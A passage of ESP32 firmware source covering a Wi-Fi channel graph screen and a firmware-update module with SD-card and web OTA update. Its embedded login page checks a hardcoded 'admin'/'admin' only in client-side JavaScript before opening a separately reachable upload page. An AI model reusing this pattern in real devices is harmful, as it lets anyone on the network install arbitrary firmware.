// to the WiFi submenu, and SELECT (center) triggers a manual rescan.
static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels("Back", nullptr, "Rescan", nullptr, nullptr);
  redrawTouchButtonBar();
}

static void drawTabBarFallback() {
  if (featureHasTouchNavBar()) {
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  FeatureUI::drawButtonRect(0, 304, 70, 16, "Back", FeatureUI::ButtonStyle::Secondary, false, false);
  FeatureUI::drawButtonRect(170, 304, 70, 16, "Rescan", FeatureUI::ButtonStyle::Secondary, false, false);
}

static void handleTabBarFallbackTouch() {
  if (featureHasTouchNavBar()) return;
  int x, y;
  if (!feature_active || !readTouchXY(x, y)) return;
  if (y < 300) return;
  if (x <= 70) {
    feature_exit_requested = true;
  } else if (x >= 170) {
    startScan();
    s_needRedraw = true;
  }
  delay(120);
}

void channelGraphSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  s_count = 0;
  s_hasSelection = false;
  s_scanning = false;
  s_asyncScanActive = false;
  s_uiDrawn = false;
  s_needRedraw = true;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, true);
  drawHeaderRow();
  updateNavLabels();
  drawTabBarFallback();

  startScan();
}

void channelGraphLoop() {
  // Deliberately not featureExitButtonPressed() (that's hardwired to
  // BTN_SELECT) — here LEFT exits and SELECT is Rescan instead.
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    abortAsyncScanIfAny();
    feature_exit_requested = true;
    return;
  }

  updateStatusBar();
  maintainTouchNavBar();

  if (isButtonPressedEdge(BTN_SELECT) && !s_scanning) {
    startScan();
  }

  pollScan();
  handleTouch();
  handleTabBarFallbackTouch();

  // Passive auto-rescan so the graph stays live without the user tapping
  // Rescan every time (mirrors the WiFi 2.4GHz Scanner's own background refresh).
  if (!s_scanning && (millis() - s_lastAutoScanMs > AUTO_RESCAN_MS)) {
    startScan();
  }

  if (s_scanning) {
    drawScanningIndicator();
  } else if (s_needRedraw) {
    drawHeaderRow();
    drawGraph();
    s_needRedraw = false;
  }
}

}  // namespace ChannelGraph


namespace FirmwareUpdate {

#define FIRMWARE_FILE "/firmware.bin"

const char* host = "esp32";

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

#define BUTTON_WIDTH 230
#define BUTTON_HEIGHT 20
#define BUTTON1_X 5
#define BUTTON1_Y 50
#define BUTTON2_X 5
#define BUTTON2_Y 80

#define TAB_BUTTON_WIDTH 57
#define TAB_BUTTON_HEIGHT 16
#define TAB_LEFT_X 0
#define TAB_MIDDLE_X 117
#define TAB_RIGHT_X 177
#define TAB_Y 304

#define TS_MIN_X 300
#define TS_MAX_X 3800
#define TS_MIN_Y 300
#define TS_MAX_Y 3800

#define FW_NETWORKS_PER_PAGE 15
#define NETWORK_Y_START 70
#define NETWORK_ROW_HEIGHT 15

#define PASSWORD_MAX_LENGTH 32

WebServer server(80);

char selectedSSID[32] = "";
char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";

typedef struct {
  char ssid[32];
  int8_t rssi;
  uint8_t channel;
  uint8_t authmode;
} NetworkInfo;

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled);
void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
void drawMenu();
bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
static bool waitForTouchXY(int& x, int& y);
void performSDUpdate();
void drawNetworkList(int, int, NetworkInfo*, int);
bool selectWiFiNetwork();
bool enterWiFiPassword();
void performWebOTAUpdate();

const char* loginIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Login Page</title>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 1rem;
            color: #E0E0E0;
        }
        input[type='text'],
        input[type='password'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>ESP32 Login Page</h2>
        <form name='loginForm'>
            <div class='form-group'>
                <label for='userid'>Username:</label>
                <input type='text' name='userid' id='userid'>
            </div>
            <div class='form-group'>
                <label for='pwd'>Password:</label>
                <input type='password' name='pwd' id='pwd'>
            </div>
            <input type='submit' onclick='check(this.form); return false;' value='Login'>
        </form>
    </div>
    <script>
        function check(form) {
            if (form.userid.value == 'admin' && form.pwd.value == 'admin') {
                window.open('/serverIndex');
            } else {
                alert('Error Password or Username');
            }
        }
    </script>
</body>
</html>
)";

const char* serverIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Firmware Update</title>
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        input[type='file'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
            cursor: pointer;
        }
        input[type='file']::-webkit-file-upload-button {
            background-color: #4A4A4A;
            color: #E0E0E0;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='file']::-webkit-file-upload-button:hover {
            background-color: #5A5A5A;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
        #progress-container {
            margin-top: 1rem;
            width: 100%;
            background-color: #3A3A3A;
            border-radius: 5px;
            overflow: hidden;
        }
        #prg {
            width: 0%;
            height: 20px;
            background-color: #FFE221;
            text-align: center;
            line-height: 20px;
            color: #1A1A1A;
            border-radius: 5px;
            transition: width 0.3s ease-in-out;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>Firmware Update</h2>
        <form method='POST' action='#' enctype='multipart/form-data' id='upload_form'>
            <div class='form-group'>
                <input type='file' name='update'>
            </div>
            <input type='submit' value='Update'>
        </form>
        <div id='progress-container'>
            <div id='prg'>progress: 0%</div>
        </div>
    </div>
    <script>
        $('form').submit(function(e) {
            e.preventDefault();
            var form = $('#upload_form')[0];
            var data = new FormData(form);
            $.ajax({
                url: '/update',
                type: 'POST',
                data: data,
                contentType: false,
                processData: false,
                xhr: function() {
                    var xhr = new window.XMLHttpRequest();
                    xhr.upload.addEventListener('progress', function(evt) {
                        if (evt.lengthComputable) {
                            var per = evt.loaded / evt.total;
                            var percent = Math.round(per * 100);
                            $('#prg').css('width', percent + '%').text('progress: ' + percent + '%');
                        }
                    }, false);
                    return xhr;
                },
                success: function(d, s) {
                    console.log('success!');
                },
                error: function(a, b, c) {
                    console.log('error:', c);
                }
            });
        });
    </script>
</body>
</html>
)";

static bool uiDrawn = false;
static FeatureUI::Button s_fwFooter[4];
static uint8_t s_fwFooterCount = 0;
static char s_fwNavCache[5][16] = {{0}};

static void fwResetNavCache() {
  for (int i = 0; i < 5; ++i) {
    s_fwNavCache[i][0] = '\0';
  }
}

static int fwContentBottom() {
  return featureHasTouchNavBar() ? (int)touchNavContentBottomY() : SCREEN_HEIGHT;
}

static void fwUpdateNavLabels(const char* left, const char* down, const char* center,
                              const char* up, const char* right) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const char* src[5] = {left, down, center, up, right};
  bool same = true;
  for (int i = 0; i < 5; ++i) {
    const char* s = (src[i] && src[i][0]) ? src[i] : "";
    if (strcmp(s_fwNavCache[i], s) != 0) {
      same = false;
      break;
    }
  }
  if (same) {
    return;
  }
  for (int i = 0; i < 5; ++i) {
    const char* s = (src[i] && src[i][0]) ? src[i] : "";
    strncpy(s_fwNavCache[i], s, sizeof(s_fwNavCache[i]) - 1);
    s_fwNavCache[i][sizeof(s_fwNavCache[i]) - 1] = '\0';
  }
  setTouchNavLabels(left, down, center, up, right);
  redrawTouchButtonBar();
}

void runUI();

static void fwEnsureToolbar() {
  if (!uiDrawn) {
    runUI();
  }
  if (featureHasTouchNavBar()) {
    maintainTouchNavBar();
  }
}

static void fwRestoreNavChrome() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  invalidateTouchButtonCue();
  maintainTouchNavBar();
}

static void fwClearBody(uint16_t color = TFT_BLACK) {
  const int bottom = fwContentBottom();
  if (bottom > 37) {
    tft.fillRect(0, 37, 240, bottom - 37, color);
  }
  fwRestoreNavChrome();
}

static bool fwTouchInFooter(int x, int y, uint8_t index);
static bool fwTouchFooterLabel(int x, int y, const char* label);

static bool fwActionPressed(const char* label, int x = 0, int y = 0, bool touchValid = false) {
  if (!label || !label[0]) {
    return false;
  }
  if (featureHasTouchNavBar()) {
    if (strcmp(label, "Back") == 0 || strcmp(label, "Exit") == 0 || strcmp(label, "Cancel") == 0) {
      return isButtonPressedEdge(BTN_LEFT);
    }
    if (strcmp(label, "Start") == 0 || strcmp(label, "OK") == 0 || strcmp(label, "Rescan") == 0) {
      return isButtonPressedEdge(BTN_SELECT);
    }
    if (strcmp(label, "Prev") == 0) {
      return isButtonPressedEdge(BTN_UP);
    }
    // Remapped layout: Next always sits on DOWN (was RIGHT; Prev/Next
    // always sit on UP/DOWN).
    if (strcmp(label, "Next") == 0) {
      return isButtonPressedEdge(BTN_DOWN);
    }
    return false;
  }
  return touchValid && fwTouchFooterLabel(x, y, label);
}

static void fwApplyTabNavLabels(const char* leftButton, const char* prevButton,
                                 const char* nextButton) {
  const char* left = nullptr;
  const char* center = nullptr;
  const char* up = nullptr;
  const char* down = nullptr;
  auto assign = [&](const char* btn) {
    if (!btn || !btn[0]) {
      return;
    }
    if (strcmp(btn, "Back") == 0 || strcmp(btn, "Exit") == 0 || strcmp(btn, "Cancel") == 0) {
      left = btn;
    } else if (strcmp(btn, "Start") == 0 || strcmp(btn, "OK") == 0 || strcmp(btn, "Rescan") == 0) {
      center = btn;
    } else if (strcmp(btn, "Prev") == 0) {
      up = btn;
    } else if (strcmp(btn, "Next") == 0) {
      // Remapped layout: Next always sits on DOWN (was RIGHT).
      down = btn;
    }
  };
  assign(leftButton);
  assign(prevButton);
  assign(nextButton);
  fwUpdateNavLabels(left, down, center, up, nullptr);
}

static void fwDrawFooterButtons() {
  for (uint8_t i = 0; i < s_fwFooterCount; ++i) {
    FeatureUI::drawButton(s_fwFooter[i]);
  }
}

static bool fwTouchInFooter(int x, int y, uint8_t index) {
  if (index >= s_fwFooterCount) return false;
  const auto& b = s_fwFooter[index];
  return x >= b.x && x <= (b.x + b.w) && y >= b.y && y <= (b.y + b.h);
}

static bool fwTouchFooterLabel(int x, int y, const char* label) {
  if (!label || !label[0]) return false;
  for (uint8_t i = 0; i < s_fwFooterCount; ++i) {
    if (s_fwFooter[i].label && strcmp(s_fwFooter[i].label, label) == 0) {
      return fwTouchInFooter(x, y, i);
    }
  }
  return false;
}

static void fwStoreFooter(const FeatureUI::Button* src, uint8_t count) {
  s_fwFooterCount = count;
  for (uint8_t i = 0; i < count && i < 4; ++i) {
    s_fwFooter[i] = src[i];
  }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

  static int iconX[ICON_NUM] = {10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
         case 0:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (!featureHasTouchNavBar() && feature_active && readTouchXY(x, y)) {
      if (y >= STATUS_BAR_Y_OFFSET && y <= STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT - 1) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x >= iconX[i] && x <= iconX[i] + ICON_SIZE - 1) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    (void)leftDisabled;
    (void)prevDisabled;
    (void)nextDisabled;
    fwApplyTabNavLabels(leftButton, prevButton, nextButton);
    return;
  }
  FeatureUI::drawFooterBg();
  s_fwFooterCount = 0;

  const bool hasLeft = leftButton && leftButton[0];
  const bool hasMid = prevButton && prevButton[0];
  const bool hasRight = nextButton && nextButton[0];

  if (hasLeft && hasMid && hasRight) {
    FeatureUI::Button btns[3];
    FeatureUI::layoutFooter3(btns,
      leftButton, FeatureUI::ButtonStyle::Secondary,
      prevButton, FeatureUI::ButtonStyle::Secondary,
      nextButton, FeatureUI::ButtonStyle::Secondary,
      leftDisabled, prevDisabled, nextDisabled);
    fwStoreFooter(btns, 3);
  } else if (hasLeft && hasMid) {
    FeatureUI::Button btns[2];
    FeatureUI::layoutFooter2(btns,
      leftButton, FeatureUI::ButtonStyle::Secondary,
      prevButton, FeatureUI::ButtonStyle::Secondary,
      leftDisabled, prevDisabled);
    fwStoreFooter(btns, 2);
  } else if (hasLeft && hasRight) {
    FeatureUI::Button btns[2];
    FeatureUI::layoutFooter2(btns,
      leftButton, FeatureUI::ButtonStyle::Secondary,
      nextButton, FeatureUI::ButtonStyle::Secondary,
      leftDisabled, nextDisabled);
    fwStoreFooter(btns, 2);
  } else if (hasMid && hasRight) {
    FeatureUI::Button btns[2];
    FeatureUI::layoutFooter2(btns,
      prevButton, FeatureUI::ButtonStyle::Secondary,
      nextButton, FeatureUI::ButtonStyle::Secondary,
      prevDisabled, nextDisabled);
    fwStoreFooter(btns, 2);
  } else if (hasRight) {
    FeatureUI::layoutFooter1(s_fwFooter[0], nextButton, FeatureUI::ButtonStyle::Secondary, nextDisabled);
    s_fwFooterCount = 1;
  } else if (hasLeft) {
    FeatureUI::layoutFooter1(s_fwFooter[0], leftButton, FeatureUI::ButtonStyle::Secondary, leftDisabled);
    s_fwFooterCount = 1;
  } else if (hasMid) {
    FeatureUI::layoutFooter1(s_fwFooter[0], prevButton, FeatureUI::ButtonStyle::Secondary, prevDisabled);
    s_fwFooterCount = 1;
  }
  fwDrawFooterButtons();
}

static void drawNetworkTabBar(bool prevDisabled, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    // Remapped layout: Next always sits on DOWN (was RIGHT; Prev/Next
    // always sit on UP/DOWN).
    fwUpdateNavLabels("Back", nextDisabled ? nullptr : "Next", "Rescan",
                      prevDisabled ? nullptr : "Prev", nullptr);
    return;
  }
  FeatureUI::drawFooterBg();
  FeatureUI::Button btns[4];
  FeatureUI::layoutFooter4(btns,
    "Back", FeatureUI::ButtonStyle::Secondary,
    "Rescan", FeatureUI::ButtonStyle::Secondary,
    "Prev", FeatureUI::ButtonStyle::Secondary,
    "Next", FeatureUI::ButtonStyle::Secondary,
    false, false, prevDisabled, nextDisabled);
  fwStoreFooter(btns, 4);
  fwDrawFooterButtons();
}

void drawMenu() {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  const int bodyBottom = fwContentBottom();
  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);

  tft.setTextSize(1);

  drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "SD Update", false, false);
  drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "Web OTA", false, false);

  if (featureHasTouchNavBar()) {
    fwUpdateNavLabels("Exit", nullptr, nullptr, nullptr, nullptr);
  } else {
    FeatureUI::drawFooterBg();
    FeatureUI::layoutFooter1(s_fwFooter[0], "Back", FeatureUI::ButtonStyle::Secondary, false);
    s_fwFooterCount = 1;
    FeatureUI::drawButton(s_fwFooter[0]);
  }
}

bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH) {
  return x >= buttonX && x <= buttonX + buttonW - 1 &&
         y >= buttonY && y <= buttonY + buttonH - 1;
}

// Returns true when Back was pressed via touch nav (edge already consumed).
static bool waitForTouchXY(int& x, int& y) {
  fwEnsureToolbar();
  while (true) {
    if (feature_exit_requested) {
      x = y = 0;
      return false;
    }
    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
      if (fwActionPressed("Back")) {
        x = y = 0;
        return true;
      }
    }
    if (readTouchXY(x, y)) {
      delay(80);
      return false;
    }
    delay(10);
  }
}

int yshift = 40;

void performSDUpdate() {
  updateStatusBar();
  runUI();
  uiDrawn = false;
  fwClearBody(TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("SD Update");
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(10, 30 + yshift);
  tft.println("Insert SD card with");
  tft.setCursor(10, 40 + yshift);
  tft.println("firmware.bin in root");
  tft.setCursor(10, 50 + yshift);
  tft.println("Touch Start to update");

  drawTabBar("Start", false, "", false, "Back", false);
  fwRestoreNavChrome();

  bool waitingForStart = true;

  while (waitingForStart) {
    if (feature_exit_requested) {
      return;
    }
    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
    }
    if (fwActionPressed("Back")) {
      drawMenu();
      return;
    }
    if (fwActionPressed("Start")) {
      waitingForStart = false;
      continue;
    }
    int x, y;
    if (readTouchXY(x, y)) {
      if (fwActionPressed("Back", x, y, true)) {
        drawMenu();
        return;
      }
      if (fwActionPressed("Start", x, y, true)) {
        waitingForStart = false;
      }
      delay(50);
    } else {
      delay(10);
    }
  }

  fwClearBody(TFT_BLACK);
  tft.setCursor(10, 10 + yshift);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.println("Starting SD Update...");
  drawTabBar("", false, "", false, "Back", false);
  fwRestoreNavChrome();
  fwEnsureToolbar();

  bool proceed = true;
  uint32_t lastInputMs = 0;
  while (proceed) {
    const uint32_t now = millis();
    if (feature_exit_requested) {
      return;
    }
    if ((uint32_t)(now - lastInputMs) >= 50u) {
      lastInputMs = now;
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (fwActionPressed("Back")) {
        drawMenu();
        return;
      }
      int x, y;
      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
        drawMenu();
        return;
      }
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.println("Initializing SD...");

    bool ok = isSDCardAvailable();
    if (!ok) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 40 + yshift);
      tft.println("X SD init failed!");
      tft.setCursor(10, 50 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      continue;
    }
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 40 + yshift);
    tft.println("SD card OK");

    if (!SD.exists(FIRMWARE_FILE)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Firmware not found!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      continue;
    }

    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
    if (!firmwareFile) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X File open failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      continue;
    }

    size_t fileSize = firmwareFile.size();
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50 + yshift);
    tft.printf("Size: %u bytes\n", fileSize);
    if (!Update.begin(fileSize)) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update init failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      continue;
    }

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 60 + yshift);
    tft.println("Updating...");
    size_t written = Update.writeStream(firmwareFile);
    if (written != fileSize) {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Update failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      continue;
    }

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 20 + yshift);
    tft.println("Update OK!");
    if (Update.end(true)) {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("Rebooting...");
      delay(2000);
      ESP.restart();
    } else {
      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(10, 30 + yshift);
      tft.println("X Finalize failed!");
      tft.setCursor(10, 40 + yshift);
      tft.println("Touch to retry or Back");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      int x, y;
      if (waitForTouchXY(x, y)) {
        drawMenu();
        return;
      }
      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
      tft.setCursor(10, 10 + yshift);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.println("Starting SD Update...");
      drawTabBar("", false, "", false, "Back", false);
      fwRestoreNavChrome();
      continue;
    }
    proceed = false;
  }
}

bool selectWiFiNetwork() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.setCursor(10, 50);
  tft.setTextColor(GREEN);
  tft.setTextSize(1);
  tft.println("Scanning.");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int numNetworks = WiFi.scanNetworks();
  if (numNetworks <= 0) {
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
    tft.setCursor(10, 60);
    tft.println("Touch to retry");
    drawTabBar("Back", false, "Rescan", false, "", true);
    fwEnsureToolbar();
    while (true) {
      if (featureHasTouchNavBar()) {
        maintainTouchNavBar();
      }
      if (fwActionPressed("Back")) {
        return false;
      }
      if (fwActionPressed("Rescan")) {
        return selectWiFiNetwork();
      }
      int x, y;
      if (readTouchXY(x, y)) {
        delay(200);
        if (fwActionPressed("Back", x, y, true)) {
          return false;
        }
        if (fwActionPressed("Rescan", x, y, true)) {
          return selectWiFiNetwork();
        }
        break;
      }
      delay(10);
    }
    return false;
  }

  NetworkInfo* networks = new NetworkInfo[numNetworks];
  for (int i = 0; i < numNetworks; i++) {
    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
    networks[i].ssid[31] = '\0';
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].authmode = WiFi.encryptionType(i);
  }

  int startIndex = 0;
  int selectedIndex = -1;
  bool selected = false;
  int lastPaintedStart = -1;
  int lastPaintedSel = -2;
  while (!selected) {
    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
    }
    if (feature_exit_requested) {
      delete[] networks;
      wifiPassword[0] = '\0';
      return false;
    }
    if (fwActionPressed("Back")) {
      delete[] networks;
      wifiPassword[0] = '\0';
      return false;
    }
    if (fwActionPressed("Rescan")) {
      delete[] networks;
      return selectWiFiNetwork();
    }
    if (fwActionPressed("Prev") && startIndex > 0) {
      startIndex -= FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (fwActionPressed("Next") && startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
      startIndex += FW_NETWORKS_PER_PAGE;
      selectedIndex = -1;
    }
    if (startIndex != lastPaintedStart || selectedIndex != lastPaintedSel) {
      drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
      lastPaintedStart = startIndex;
      lastPaintedSel = selectedIndex;
    }
    int x, y;
    if (!readTouchXY(x, y)) {
      delay(10);
      continue;
    }
    delay(200);

    int y_pos = NETWORK_Y_START;
    int end_index = min(startIndex + FW_NETWORKS_PER_PAGE, numNetworks);
    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
